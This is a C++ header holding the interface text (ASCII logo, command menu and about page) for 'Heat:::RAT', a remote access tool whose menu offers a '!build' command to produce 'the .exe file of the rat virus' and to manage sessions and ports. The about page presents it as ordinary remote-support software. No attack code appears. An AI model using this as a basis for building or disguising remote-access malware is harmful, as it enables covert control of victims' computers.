#pragma once
#include "main.h"

namespace Modules 
{
	extern inline std::string logo = R"LOGO(##########################################################################################################################
#....######....##.............######.....###...............####################.............######......###..............#
#....######....##.............#####.......##...............#.######.######.####..............#####.......##..............#
#..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....######
#..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....######
#..............##.............###............####.....#########################...........#####............#####....######
#....######....##.....##########..............###.....########################....##.......##..............#####....######
#....#####.....##..............................##.....####.....##.....##.....##....####......................###....######
#....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....######
##########################################################################################################################)LOGO";

	extern inline string comands_menu = R"context(                                               commands available in menu
========================================================================================================================
command = "!help"
using for: show a list of all available commands in menu

========================================================================================================================
command = "!close"
using for: exit app

========================================================================================================================
command = "!preferences"
using for: transition to the preferences tab

========================================================================================================================
command = "!ports"
using for: transition to the ports preferences tab

========================================================================================================================
command = "!github"
using for: open the creator page in GitHub in the browser

========================================================================================================================
command = "!build"
using for: build the .exe file of the rat virus

========================================================================================================================
command = "!sessions"
using for: transition to the tab with all opened sessions

========================================================================================================================
command = "!logs"
using for: show a list of all saved logs

========================================================================================================================
command = "!about"
using for: all about app

========================================================================================================================)context";

	extern inline string about = R"context(                                                                 about
========================================================================================================================
Heat:::RAT allows a user to remotely access a computer or device from another location, over the internet.

The program connects the two computers using encryption technologies to protect sensitive data and prevent unauthorized access.
Once the connection is established, the user can access and control the remote computer or device as
if they were physically present at that location.

Programs include features such as file transfer, remote printing, and the ability to share screens with other users.
They can be used for a variety of purposes, including remote technical support, remote collaboration,
and accessing files or software that are only available on a specific computer or device.

Creator (https://github.com/Nick-Vinesmoke)
Language Cpp
========================================================================================================================)context";
}
//R"context()context"
